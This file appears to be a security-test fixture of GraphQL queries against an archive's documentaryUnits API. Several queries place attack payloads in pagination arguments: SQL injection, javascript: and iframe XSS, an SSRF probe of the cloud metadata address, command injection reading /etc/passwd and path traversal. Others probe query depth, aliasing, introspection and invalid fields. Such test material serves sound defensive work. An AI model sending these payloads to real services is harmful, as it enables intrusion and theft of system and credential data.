query.query:
query {
  documentaryUnits(first: 10) {
    items {
      id
      identifier
      descriptions {
        name
        dates {
          startDate
        }
      }
    }
    pageInfo {
      hasNextPage
    }
  }
}

query {
  documentaryUnits(from: "1' UNION SELECT * FROM documentary_units WHERE '1'='1' --") {
    items {
      id
      type
      repository {
        id
        identifier
      }
    }
  }
}

query {
  documentaryUnits(after: "javascript:alert(document.cookie)") {
    items {
      identifier
      descriptions {
        name
        rulesAndConventions
      }
      links {
        webpage
      }
    }
  }
}

query {
  documentaryUnits(from: "http://169.254.169.254/latest/meta-data") {
    items {
      id
      repository {
        links {
          description
        }
      }
    }
  }
}

query {
  documentaryUnits(after: "127.0.0.1 | cat /etc/passwd") {
    items {
      id
      systemEvents {
        logMessage
      }
    }
  }
}

query {
  documentaryUnits(from: "../../../../etc/passwd%00") {
    items {
      descriptions {
        findingAids
        sources
      }
    }
  }
}

query {
  documentaryUnits(from: "<iframe src=javascript:alert('html_injection')>") {
    items {
      id
      repository {
        country {
          name
        }
      }
    }
  }
}

query {
  documentaryUnits(first: 500) {
    items {
      id
      descriptions {
        name
        datesOfDescriptions
        relatedUnitsOfDescription
      }
      systemEvents {
        eventType
        timestamp
      }
    }
  }
}

query {
  a: documentaryUnits(first: 500) {
    items { id }
  }
  b: documentaryUnits(topLevel: true) {
    items {
      descriptions {
        acquisition
      }
    }
  }
}

query {
  documentaryUnits {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
  __type(name: "DocumentaryUnit") {
    fields {
      name
      type {
        ofType {
          name
        }
      }
    }
  }
}

query {
  documentaryUnits {
    items {
      id
      invalidField
      descriptions {
        invalidSubfield
        name
      }
    }
  }
}
